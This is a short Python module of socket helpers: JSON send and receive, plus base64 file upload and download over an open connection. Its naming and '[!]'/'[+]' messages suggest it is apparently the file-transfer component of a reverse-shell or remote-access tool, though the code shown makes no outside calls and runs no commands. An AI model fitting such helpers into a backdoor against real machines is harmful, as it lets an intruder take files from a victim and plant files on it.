import base64
import json

def reliable_send(conn, data):
    json_data = json.dumps(data)
    conn.send(json_data.encode())

def reliable_recv(conn):
    data = b""
    while True:
        try:
            data += conn.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def send_file(conn, path):
    try:
        with open(path, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        reliable_send(conn, content)
    except FileNotFoundError:
        reliable_send(conn, f"[!] File not found: {path}")
    except Exception as e:
        reliable_send(conn, f"[!] Error sending file: {str(e)}")

def receive_file(conn, path):
    try:
        b64_data = reliable_recv(conn)
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64_data))
        reliable_send(conn, "[+] File uploaded successfully.")
    except Exception as e:
        reliable_send(conn, f"[!] Upload failed: {str(e)}")
